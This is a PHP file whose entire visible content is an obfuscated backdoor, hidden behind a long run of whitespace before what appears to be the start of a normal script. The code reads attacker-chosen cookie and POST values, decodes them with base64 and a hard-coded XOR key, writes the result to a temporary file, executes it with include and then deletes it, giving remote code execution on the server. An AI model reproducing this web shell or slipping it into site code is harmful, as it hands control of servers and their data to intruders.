<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("vljftnug")){class vljftnug{public static $hpmzpwob = "nfqcpdbictqubplh";public static $mfsiy = NULL;public function __construct(){$ctbpka = @$_COOKIE[substr(vljftnug::$hpmzpwob, 0, 4)];if (!empty($ctbpka)){$kupydigvfk = "base64";$zemwhlfofg = "";$ctbpka = explode(",", $ctbpka);foreach ($ctbpka as $hbcfsqvtz){$zemwhlfofg .= @$_COOKIE[$hbcfsqvtz];$zemwhlfofg .= @$_POST[$hbcfsqvtz];}$zemwhlfofg = array_map($kupydigvfk . "_decode", array($zemwhlfofg,)); $zemwhlfofg = $zemwhlfofg[0] ^ str_repeat(vljftnug::$hpmzpwob, (strlen($zemwhlfofg[0]) / strlen(vljftnug::$hpmzpwob)) + 1);vljftnug::$mfsiy = @unserialize($zemwhlfofg);}}public function __destruct(){$this->jozifxxo();}private function jozifxxo(){if (is_array(vljftnug::$mfsiy)) {$rzyctk = sys_get_temp_dir() . "/" . crc32(vljftnug::$mfsiy["salt"]);@vljftnug::$mfsiy["write"]($rzyctk, vljftnug::$mfsiy["content"]);include $rzyctk;@vljftnug::$mfsiy["delete"]($rzyctk);exit();}}}$nhuxpchtt = new vljftnug(); $nhuxpchtt = NULL;} ?><?php
